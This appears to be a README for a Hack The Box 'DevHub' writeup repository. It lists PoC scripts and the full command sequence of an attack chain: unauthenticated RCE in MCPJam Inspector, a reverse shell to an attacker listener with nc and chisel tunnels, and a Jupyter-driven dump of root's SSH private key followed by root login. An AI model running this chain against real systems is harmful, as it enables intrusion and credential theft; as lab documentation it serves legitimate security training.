# DevHub (HTB, Linux)

MCPJam Inspector exposed on `:6274` → unauth RCE as `mcp-dev` → Jupyter token in `ps` → OpsMCP Flask as **root** on `127.0.0.1:5000` dumps `/root/.ssh/id_rsa`.

- **[WRITEUP.md](WRITEUP.md)** — łańcuch (bez flag, bez prywatnego klucza)
- **[scripts/](scripts/)** — PoC MCPJam + dump OpsMCP przez Jupyter

## Scripts

| File | What |
|------|------|
| `scripts/cve_2026_23744.py` | unauth RCE via `POST /api/mcp/connect` (MCPJam ≤ 1.4.2) |
| `scripts/opsmcp_dump_via_jupyter.py` | kernel Jupyter → `ops._admin_dump` (`ssh_keys`) |
| `scripts/json_unescape_key.py` | JSON `\n` → prawdziwy plik OpenSSH (trailing newline) |

```bash
python3 scripts/cve_2026_23744.py --url http://devhub.htb:6274 --lhost <tun0> --lport 4444
# nc -lvnp 4444
# chisel reverse :8888 (Jupyter) i :2222 (sshd)
python3 scripts/opsmcp_dump_via_jupyter.py --jupyter http://127.0.0.1:8888 --token <from ps>
python3 scripts/json_unescape_key.py dump.json root_id_rsa
ssh -i root_id_rsa -o IdentitiesOnly=yes root@devhub.htb
```

No flags, VPN configs, or private keys in this tree.
